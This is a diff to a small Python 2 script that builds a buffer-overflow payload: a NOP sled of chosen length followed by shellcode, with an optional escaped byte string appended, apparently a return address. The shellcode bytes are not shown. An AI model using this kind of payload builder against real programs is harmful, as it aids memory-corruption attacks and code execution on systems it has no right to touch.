@@ -7,5 +7,18 @@ def shellcode(length=1000):
   return NOP * (length - len(SHELL_CODE)) + SHELL_CODE
 
 if __name__ == '__main__':
-  print shellcode()
+  import sys
+
+  # just shell code
+  if len(sys.argv) == 1:
+    print SHELL_CODE
+    exit(0)
+
+  shell = shellcode(int(sys.argv[1]))
+
+  if len(sys.argv) > 2:
+    shell += sys.argv[2].decode('string_escape')
+
+  print shell
+
 
